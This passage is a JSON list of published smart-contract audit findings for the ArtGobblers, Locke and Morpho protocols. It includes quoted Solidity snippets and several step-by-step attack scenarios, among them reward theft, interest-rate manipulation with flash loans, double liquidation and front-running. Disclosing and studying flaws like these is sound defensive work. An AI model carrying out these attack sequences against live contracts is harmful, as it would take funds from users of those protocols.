[{"title": "Potential issues due to slippage when minting legendary gobblers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The price of a legendary mint is a function of the number of gobblers minted from goo. Because of the strict check that the price is exactly equal to the number of gobblers supplied, this can lead to slippage issues. That is, if there is a transaction that gets mined in the same block as a legendary mint, and before the call to mintLegendaryGobbler, the legendary mint will revert. uint256 cost = legendaryGobblerPrice(); if (gobblerIds.length != cost) revert IncorrectGobblerAmount(cost);", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Users who claim early have an advantage in goo production", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The gobblers are revealed in ascending order of the index in revealGobblers. However, there can be cases when this favours users who were able to claim early: 1. There is the trivial case where a user who claimed a day earlier will have an advantage in gooBalance as their emission starts earlier. 2. For users who claimed the gobblers on the same day (in the same period between a reveal) the advantage depends on whether the gobblers are revealed in the same block or not. 1. If there is a large number of gobbler claims between two aforementioned gobblers, then it may not be possible to call revealGobblers, due to block gas limit. 2. A user at the beginning of the reveal queue may call revealGobblers for enough indices to reveal their gobbler early. In all of the above cases, the advantage is being early to start the emission of the Goo.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Add a negativity check for decayConstant in the constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "Price is designed to decay as time progresses. For this, it is important that the constant decayCon- stant is negative. Since the value is derived using an on-chain logarithm computation once, it is useful to check that the value is negative. Also, typically decay constant is positive, for example, in radioactive decay the negative sign is explicitly added in the function. It is worth keeping the same convention here, i.e., keep decayConstant as a positive number and add the negative sign in getPrice function. However, this may cause a small increase in gas and therefore may not be worth implementing in the end.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Consideration on possible Chainlink integration concerns", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The ArtGobbler project relies on the Chainlink v1 VRF service to reveal minted gobblers and assign a random emissionMultiple that can range from 6 to 9. The project has estimated that minting and revealing all gobblers will take about 10 years. In the scenario simulated by the discussion \"Test to mint and reveal all the gobblers\" the number of requestRan- domSeed and fulfillRandomness made to reveal all the minted gobblers were more than 1500. Given the timespan of the project, the number of requests made to Chainlink to request a random number and the fundamental dependency that Chainlink VRF v1 has, we would like to highlight some concerns:  What would happen if Chainlink completely discontinues the Chainlink VRF v1? At the current moment, Chainlink has already released VRF v2 that replaces and enhances VRF v1.  What would happen in case of a Chainlink service outage and for some reason they decide not to pro- cess previous requests? Currently, the ArtGobbler contract does not allow to request a new \"request for randomness\". 13  What if the fulfillRandomness always gets delayed by a long number of days and users are not able to reveal their gobblers? This would not allow them to know the value of the gobbler (rarity and the visual representation) and start compounding $GOO given the fact that the gobbler does not have an emission multiple associated yet.  What if for error or on purpose (malicious behavior) a Chainlink operator calls fulfillRandomness multi- ple times changing the randomSeed during a reveal phase (the reveal of X gobbler can happen in multiple stages)?", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "The function toString() does not return a string aligned to a 32-byte word boundary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "It is a good practice to align memory regions to 32-byte word boundaries. This is not necessarily the case here. However, we do not think this can lead to issues.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Considerations on Legendary Gobbler price mechanics", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The auction price model is made in a way that starts from a startPrice and decays over time. Each time a new action starts the price time will be equal to max(69, prevStartPrice * 2). Users in this case are incentivized to buy the legendary gobbler as soon as the auction starts because by doing so they are going to burn the maximum amount allowed of gobblers, allowing them to maximize the final emission multiple of the minted legendary gobbler. By doing this, you reach the end goal of maximizing the account's $GOO emissions. By waiting, the cost price of the legendary gobbler decays, and it also decays the emission multiple (because you can burn fewer gobblers). This means that if a user has enough gobblers to burn, he/she will burn them as soon as the auction starts. Another reason to mint a legendary gobbler as soon as the auction starts (and so burn as many gobblers as possible) is to make the next auction starting price as high as possible (always for the same reason, to be able to maximize the legendary gobbler emissions multiple). The next auction starting price is determined by legendaryGobblerAuctionData.startPrice = uint120(cost < 35 ? 69 : cost << 1); These mechanisms and behaviors can result in the following consequences:  Users that will have a huge number of gobblers will burn them as soon as possible, disallowing others that can't afford it to wait for the price to decay.  There will be less and less \"normal\" gobblers available to be used as part of the \"art\" aspect of the project. In the discussion \"Test to mint and reveal all the gobblers\" we have simulated a scenario in which a whale would be interested to collect all gobblers with the end goal of maximizing $GOO production. In that scenario, when the last Legendary Gobbler is minted we have estimated that 9644 gobbler have been burned to mint all the legendaries. 14", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Define a LEGENDARY_GOBBLER_INITIAL_START_PRICE constant to be used instead of hardcoded 69", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "69 is currently the starting price of the first legendary auction and will also be the price of the next auction if the previous one (that just finished) was lower than 35. There isn't any gas benefit to use a constant variable but it would make the code cleaner and easier to read instead of having hard-coded values directly.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Update ArtGobblers comments about some variable/functions to make them more clear", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "Some comments about state variables or functions could be improved to make them clearer or remove any further doubts. LEGENDARY_AUCTION_INTERVAL /// @notice Legendary auctions begin each time a multiple of these many gobblers have been minted. It could make sense that this comment specifies \"minted from Goo\" otherwise someone could think that also the \"free\" mints (mintlist, legendary, reserved) could count to determine when a legendary auction start. EmissionData.lastTimestamp // Timestamp of last deposit or withdrawal. These comments should be updated to cover all the scenarios where lastBalance and lastTimestamp are up- dated. Currently, they are updated in many more cases for example:  mintLegendaryGobbler  revealGobblers  transferUserEmissionMultiple getGobblerData[gobblerId].emissionMultiple = uint48(burnedMultipleTotal << 1) has an outdated comment. The current present in the mintLegendaryGobbler function has the following comment: line getGobblerData[gobblerId].emissionMultiple = uint48(burnedMultipleTotal << 1) // Must be done before minting as the transfer hook will update the user's emissionMultiple. In both ArtGobblers and GobblersERC1155B there isn't any transfer hook, which could mean that the referred comment is referencing outdated code. We suggest removing or updating the comment to reflect the current code implementation. legendaryGobblerPrice numMintedAtStart calculation. 15 The variable numMintedAtStart is calculated as (numSold + 1) * LEGENDARY_AUCTION_INTERVAL The comment above the formula does not explain why it uses (numSold + 1) instead of numSold. This reason is correctly explained by a comment on LEGENDARY_AUCTION_INTERVAL declaration. It would be better to also update the comment related to the calculation of numMintedAtStart to explain why the current formula use (numSold + 1) instead of just numSold transferUserEmissionMultiple The above utility function transfers an amount of a user's emission's multiple to another user. Other than transfer- ring that emission amount, it also updates both users lastBalance and lastTimestamp The natspec comment should be updated to cover this information.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Mark functions not called internally as external to improve code quality", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The following functions could be declared as external to save gas and improve code quality:  Goo.mintForGobblers  Goo.burnForGobblers  Goo.burnForPages  GobblerReserve.withdraw", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "UnaccruedSeconds do not increase even if nobody is actively staking", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The unstreamed variable tracks whether someone is staking in the contract or not. However, because of the division precision loss at Locke.sol#L164-L166 and Locke.sol#L187, unstreamed > 0 may happen even when everyone has already withdrawn all deposited tokens from the contract, i.e. ts.token = 0 for everyone. Consider the following proof of concept with only two users, Alice and Bob:  streamDuration = 8888  At t = startTime, Alice stakes 1052 wei of deposit tokens.  At t = startTime + 99, Bob stakes 6733 wei of deposit tokens.  At t = startTime + 36, both Alice and Bob exits from the contract. At this point Alices and Bobs ts.tokens are both 0 but unstreamed = 1 wei. The abovementined numbers are the resault of a fuzzing campaign and were not carefully crafted, therefore this issue can also occur under normal circumstances. function updateStreamInternal() internal { ... uint256 tdelta = timestamp - lastUpdate; if (tdelta > 0) { if (unstreamed == 0) { unaccruedSeconds += uint32(tdelta); } else { unstreamed -= uint112(tdelta * unstreamed / (endStream - lastUpdate)); } } ... }", "labels": ["Spearbit", "Locke", "Severity: High Risk"]}, {"title": "Old governor can call acceptGov() after renouncing its role through _abdicate()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The __abdicate function does not reset pendingGov value to 0. Therefore, if a pending governor is set the user can become a governor by calling acceptGov.", "labels": ["Spearbit", "Locke", "Severity: High Risk"]}, {"title": "User can lose their reward due truncated division", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The truncated division can cause users to lose rewards in this update round which may happen when any of the following conditions are true: 1. RewardToken.decimals() is too low. 2. Reward is updated too frequently. 3. StreamDuration is too large. 4. TotalVirtualBalance is too large (e.g., stake near the end of stream). This could potentially happen especially when the 1st case is true. Consider the following scenario:  rewardToken.decimals() = 6.  depositToken.decimals() can be any (assume its 18).  rewardTokenAmount = 1K * 10**6.  streamDuration = 1209600 (two weeks).  totalVirtualBalance = streamDuration * depositTokenAmount / timeRemaining where depositToken- Amount = 100K 10**18 and timeRemaining = streamDuration (a user stakes 100K at the beginning of the stream) lastApplicableTime() - lastUpdate = 100 (about 7 block-time). Then rewards = 100 * 1000 * 10**6 * 10**18 / 1209600 / (1209600 * 100000 * 10**18 / 1209600) = 0.8267 < 1. User wants to buy the reward token at the price of 100K/1K = 100 deposit token but does not get any because of the truncated division. function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { // time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance uint256 rewards; unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }", "labels": ["Spearbit", "Locke", "Severity: High Risk"]}, {"title": "The streamAmt check may prolong a user in the stream", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Assume that the amount of tokens staked by a user (ts.tokens) is low. This check allows another person to deposit a large stake in order to prolong the user in a stream (untilstreamAmt for the user becomes non-zero). For this duration the user would be receiving a bad rate or 0 altogether for the reward token while being unable to exit from the pool. if (streamAmt == 0) revert ZeroAmount(); Therefore, if Alice stakes a small amount of deposit token and Bob comes along and deposits a very large amount of deposit token, tts in Alices interest to exit the pool as early as possible especially when this is an indefinite stream. Otherwise the user would be receiving a bad rate for their deposit token.", "labels": ["Spearbit", "Locke", "Severity: Medium Risk"]}, {"title": "User can stake before the stream creator produced a funding stream", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Consider the following scenario: 1. Alice stakes in a stream before the stream starts. 2. Nobody funds the stream,. 3. In case of an indefinite stream Alice loses some of her deposit depending on when she exits the stream. For a usual stream Alice will have her deposit tokens locked until endDepositLock.", "labels": ["Spearbit", "Locke", "Severity: Medium Risk"]}, {"title": "Potential funds locked due low token decimal and long stream duration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "In case where the deposit token decimal is too low (4 or less) or when the remaining stream duration is too long, checking streamAmt > 0 may affect regular users. They could be temporarily blocked by the contract, i.e. they cannot stake, withdraw, or get rewards, and should wait until streamAmt > 0 or the stream ends. Altough unlikely to happen it still is a potential lock of funds issue. 11 function updateStreamInternal() internal { ... if (acctTimeDelta > 0) { if (ts.tokens > 0) { uint112 streamAmt = uint112(uint256(acctTimeDelta) * ts.tokens / (endStream - ,! ts.lastUpdate)); if (streamAmt == 0) revert ZeroAmount(); ts.tokens -= streamAmt; } ... }", "labels": ["Spearbit", "Locke", "Severity: Medium Risk"]}, {"title": "Sanity check on the reward tokens decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Add sanity check on the reward tokens decimals, which shouldnt exceed 33 because Token- Stream.rewards has a uint112 type. constructor( ) { uint64 _streamId, address creator, bool _isIndefinite, address _rewardToken, address _depositToken, uint32 _startTime, uint32 _streamDuration, uint32 _depositLockDuration, uint32 _rewardLockDuration, uint16 _feePercent, bool _feeEnabled LockeERC20( _depositToken, _streamId, _startTime + _streamDuration + _depositLockDuration, _startTime + _streamDuration, _isIndefinite ) MinimallyExternallyGoverned(msg.sender) // inherit factory governance // No error code or msg to reduce bytecode size require(_rewardToken != _depositToken); // set fee info feePercent = _feePercent; feeEnabled = _feeEnabled; // limit feePercent require(feePercent < 10000); // store streamParams startTime = _startTime; streamDuration = _streamDuration; // set in shared state 12 endStream = startTime + streamDuration; endDepositLock = endStream + _depositLockDuration; endRewardLock = startTime + _rewardLockDuration; // set tokens depositToken = _depositToken; rewardToken = _rewardToken; // set streamId streamId = _streamId; // set indefinite info isIndefinite = _isIndefinite; streamCreator = creator; uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one); // set lastUpdate to startTime to reduce codesize and first users gas lastUpdate = startTime; }", "labels": ["Spearbit", "Locke", "Severity: Low Risk"]}, {"title": "Use a stricter bound for transferability delay", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "modifier transferabilityDelay { // ensure the time is after end stream if (block.timestamp < endStream) revert NotTransferableYet(); _; }", "labels": ["Spearbit", "Locke", "Severity: Low Risk"]}, {"title": "Potential issue with malicious stream creator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Assume that users staked tokens at the beginning. The malicious stream creator could come and stake an extremely large amount of tokens thus driving up the value of totalVirtualBalance. This means that users will barely receive rewards while giving away deposit tokens at the same rate. Users can exit the pool in this case to save their unstreamed tokens. 13 function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }", "labels": ["Spearbit", "Locke", "Severity: Low Risk"]}, {"title": "Moving check require(feePercent < 10000) in updateFeeParams to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "feePercent comes directly from LockeFactorys feeParams.feePercent, which is configured in the updateFeeParams function and used across all Stream contracts. Moving this check into the updateFeeParams function can avoid checking in every contract and thus save gas.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Use calldata instead of memory for some function parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Having function arguments in calldata instead of memory is more optimal in the aforementioned cases. See the following reference.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Update cumulativeRewardPerToken only once after stream ends", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Since cumulativeRewardPerToken does not change once it is updated after the stream ends, it has to be updated only once.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Expression 10**one can be unchecked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one)", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Calculation of amt can be unchecked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The value newBal in this context is always greater than prevBal because of the check located at Locke.sol#534. Therefore, we can use unchecked subtraction.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Change lastApplicableTime() to endStream", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Since block.timestamp >= endStream in the abovementioned cases the lastApplicableTime function will always return endStream.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Simplifying code logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } 17 function currDepositTokensNotYetStreamed(IStream stream, address who) external view returns (uint256) { unchecked { uint32 timestamp = uint32(block.timestamp); (uint32 startTime, uint32 endStream, ,) = stream.streamParams(); if (block.timestamp >= endStream) return 0; ( uint256 lastCumulativeRewardPerToken, uint256 virtualBalance, uint112 rewards, uint112 tokens, uint32 lastUpdate, bool merkleAccess ) = stream.tokenStreamForAccount(address(who)); if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } } }", "labels": ["Spearbit", "Locke", "Severity: Informational"]}, {"title": "Wrong P2P exchange rate calculation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "_p2pDelta is divided by _poolIndex and multiplied by _p2pRate, nevertheless it should have been multiplied by _poolIndex and divided by _p2pRate to compute the correct share of the delta. This leads to wrong P2P rates throughout all markets if supply / borrow delta is involved.", "labels": ["Spearbit", "Morpho", "Severity: Critical Risk"]}, {"title": "MatchingEngineForAave is using the wrong totalSupply in updateBorrowers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "_poolTokenAddress is referencing AToken so the totalStaked would be the total supply of the AToken. In this case, the totalStaked should reference the total supply of the DebtToken, otherwise the user would be rewarded for a wrong amount of reward.", "labels": ["Spearbit", "Morpho", "Severity: Critical Risk"]}, {"title": "RewardsManagerAave does not verify token addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Aave has 3 different types of tokens: aToken, stable debt token and variable debt token (a/s/vToken). Aaves incentive controller can define rewards for all of them but Morpho never uses a stable-rate borrows token (sToken). The public accrueUserUnclaimedRewards function allows passing arbitrary token addresses for which to accrue user rewards. Current code assumes that if the token is not the variable debt token, then it must be the aToken, and uses the users supply balance for the reward calculation as follows: 5 uint256 stakedByUser = reserve.variableDebtTokenAddress == asset ? positionsManager.borrowBalanceInOf(reserve.aTokenAddress, _user).onPool : positionsManager.supplyBalanceInOf(reserve.aTokenAddress, _user).onPool; An attacker can accrue rewards by passing in an sToken address and steal from the contract, i.e:  Attacker supplies a large amount of tokens for which sToken rewards are defined.  The aToken reward index is updated to the latest index but the sToken index is not initialized.  Attacker calls accrueUserUnclaimedRewards([sToken]), which will compute the difference between the cur- rent Aave reward index and users sToken index, then multiply it by their supply balance.  The user accumulated rewards in userUnclaimedRewards[user] can be withdrawn by calling PositionMan- ager.claimRewards([sToken, ...]).  Attacker withdraws their supplied tokens again. The abovementioned steps can be performed in one single transaction to steal unclaimed rewards from all Morpho positions.", "labels": ["Spearbit", "Morpho", "Severity: Critical Risk"]}, {"title": "FullMath requires overflow behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "UniswapV3s FullMath.sol is copied and migrated from an old solidity version to version 0.8 which reverts on overflows but the old FullMath relies on the implicit overflow behavior. The current code will revert on overflows when it should not, breaking the SwapManagerUniV3 contract.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Morphos USDT mainnet market can end up in broken state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Note that USDT on Ethereum mainnet is non-standard and requires resetting the approval to zero (see USDT L199) before being able to change it again. In _repayERC20ToPool , it could be that _amount is approved but then _amount = Math.min(...) only repays a smaller amount, meaning there remains a non-zero approval for Aave. Any further _repayERC20ToPool/_- supplyERC20ToPool calls will then revert in the approve call. Users cannot interact with most functions of the Morpho USDT market anymore. Example: Assume the attacker is first to borrow from the USDT market on Morpho.  Attacker borrows 1000 USDT through Morpho from the Aave pool (and some other collateral to cover the debt).  Attacker directly interacts with Aave to repay 1 USDT of debt for Aaves Morpho account position.  Attacker attempts to repay 1000 USDT on Morpho. the contracts debt balance is only 999 and the _amount = Math.min(_amount, variableDebtTo- ken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) computation will only repay 999. An approval of 1 USDT remains. It will approve 1000 USDT but  The USDT market is broken as it reverts on supply / repay calls when trying to approve the new amount", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Wrong reserve factor computation on P2P rates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The reserve factor is taken on the entire P2P supply and borrow rates instead of just on the spread of the pool rates. Its currently overcharging suppliers and borrowers and making it possible to earn a worse rate on Morpho than the pool rates. supplyP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS - reserveFactor[_marketAddress])) / MAX_BASIS_POINTS; borrowP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS + reserveFactor[_marketAddress])) / MAX_BASIS_POINTS;", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "SwapManager assumes Morpho token is token0 of every token pair", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The consult function wrongly assumes that the Morpho token is always the first token (token0) in the Morpho <> Reward token token pair. This could lead to inverted prices and a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "SwapManager fails at updating TWAP", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The update function returns early without updating the TWAP if the elapsed time is past the TWAP period. Meaning, once the TWAP period passed the TWAP is stale and forever represents an old value. This could lead to a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "P2P rate can be manipulated as its a lazy-updated snapshot", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The P2P rate is lazy-updated upon interactions with the Morpho protocol. It takes the mid-rate of Its possible to manipulate these rates before triggering an update on the current Aave supply and borrow rate. Morpho. function _updateSPYs(address _marketAddress) internal { DataTypes.ReserveData memory reserveData = lendingPool.getReserveData( IAToken(_marketAddress).UNDERLYING_ASSET_ADDRESS() ); uint256 meanSPY = Math.average( reserveData.currentLiquidityRate, reserveData.currentVariableBorrowRate ) / SECONDS_PER_YEAR; // In ray } Example: Assume an attacker has a P2P supply position on Morpho and wants to earn a very high APY on it. He does the following actions in a single transaction:  Borrow all funds on the desired Aave market. (This can be done by borrowing against flashloaned collateral).  The utilisation rate of the market is now 100%. The borrow rate is the max borrow rate and the supply rate is (1.0 - reserveFactor) * maxBorrowRate. The max borrow rate can be higher than 100% APY, see Aave docs.  The attacker triggers an update to the P2P rate, for example, by supplying 1 token to the pool Positions- ManagerForAave.supply(poolTokenAddress, 1, ...), triggering marketsManager.updateSPYs(_poolTo- kenAddress).  The new mid-rate is computed which will be (2.0 - reserveFactor) * maxBorrowRate / 2 ~ maxBor- rowRate.  The attacker repays their Aave debt in the same transaction, not paying any interest on it.  All P2P borrowers now pay the max borrow rate to the P2P suppliers until the next time a user interacts with the market on Morpho.  This process can be repeated to keep the APY high.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Liquidating Morphos Aave position leads to state desynchronization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Morpho has a single position on Aave that encompasses all of Morphos individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desynchronize from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. Its also possible to double-liquidate for a profit. Example: Theres a single borrower B1 on Morpho who is connected to the Aave pool.  B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho  The ETH price crashes and the position becomes liquidatable.  A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit.  This repaid debt / removed collateral is not synced with Morpho. The users supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave.  The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus.  The state remains desynced.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Frontrunners can exploit the system by not allowing head of DLL to match in P2P", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "For a given asset X, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x Whenever there is a new transaction in the mempool to borrow 100 units of x:  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will place the frontrunner on the head (assuming very high gas is supplied).  Borrowers transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a blocks time period.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "TWAP intervals should be flexible as per market conditions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The protocol is using the same TWAP_INTERVAL for both weth-morpho and weth-reward token pool while their liquidity and activity might be different. It should use separate appropriate values for both pools.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "PositionsManagerForAave claimToTreasury could allow sending underlying to 0x address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "claimToTreasury is currently not verifying if the treasuryVault address is != address(0). In the current state, it would allow the owner of the contract to burn the underlying token instead of sending it to the intended treasury address.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "rewardsManager used in MatchingEngineForAave could be not initialized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "MatchingEngineForAave update the userUnclaimedRewards for a supplier/borrower each time it gets updated. rewardsManager is not initialized in PositionsManagerForAaveLogic.initialize but only via Po- sitionsManagerForAaveGettersSetters.setRewardsManager, which means that it will start as address(0). Each time a supplier or borrower gets updated and the rewardsManager address is empty, the transaction will revert. To replicate the issue, just comment positionsManager.setRewardsManager(address(rewardsManager)); in TestSetup and run make c-TestSupply. All tests will fail with [FAIL. Reason: Address: low-level delegate call failed]", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Missing input validation checks on contract initialize/constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Contract creation/initialization of a contract in a wrong/inconsistent state. initialize/constructor input parameters should always be validated to prevent the", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Setting a new rewards manager breaks claiming old rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Setting a new rewards manager will break any old unclaimed rewards as users can only claim through the PositionManager.claimRewards function which then uses the new reward manager.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Low/high MaxGas values could make match/unmatch supplier/borrower functions always fail or revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "maxGas variable is used to determine how much gas the matchSuppliers, unmatchSuppliers, matchBorrowers and unmatchBorrowers can consume while trying to match/unmatch supplier/borrower and also updating their position if matched.  maxGas = 0 will make entirely skip the loop.  maxGas low would make the loop run at least one time but the smaller maxGas is the higher is the possibility that not all the available suppliers/borrowers are matched/unmatched.  maxGas could make the loop consume all the block gas, making the tx revert. Note that maxGas can be overriden by the user when calling supply, borrow", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "NDS min/max value should be properly validated to avoid tx to always fail/skip loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "PositionsManagerForAaveLogic is currently initialized with a default value of NDS = 20. The NDS value is used by MatchingEngineForAave when it needs to call DoubleLinkedList.insertSorted in both updateBorrowers and updateSuppliers updateBorrowers, updateSuppliers are called by  MatchingEngineForAavematchBorrowers  MatchingEngineForAaveunmatchBorrowers  MatchingEngineForAavematchSuppliers  MatchingEngineForAaveunmatchSuppliers Those functions and also directly updateBorrowers and updateSuppliers are also called by PositionsManager- ForAaveLogic Problems:  A low NDS value would make the loop inside insertSorted exit early, increasing the probability of a sup- plier/borrower to 